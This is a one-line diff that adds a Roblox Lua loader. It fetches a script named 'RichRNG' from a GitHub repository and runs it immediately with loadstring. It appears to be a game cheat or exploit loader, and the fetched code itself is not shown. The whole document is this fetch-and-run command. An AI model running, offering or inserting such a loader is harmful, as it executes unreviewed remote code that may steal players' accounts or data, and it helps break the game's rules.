@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaLover2159-ASSHATER/Scripts/main/RichRNG",true))()
